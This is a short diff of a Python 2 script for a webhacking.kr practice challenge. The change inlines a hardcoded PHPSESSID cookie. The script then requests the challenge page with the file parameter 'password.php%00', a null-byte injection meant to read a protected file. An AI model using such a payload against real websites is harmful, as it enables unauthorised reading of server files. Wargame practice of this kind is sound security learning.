@@ -6,9 +6,7 @@ import CookieManager
 
 
 challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-5/?file="
-sessionId = "e28ad7cb81a98a13982054373940bf92"
-
-CookieManager.addCookie("PHPSESSID", sessionId)
+CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")
     
 httpRequest = urllib2.Request(challengeUrl + "password.php%00")
 httpRequest.add_header("Cookie", CookieManager.getCookie())
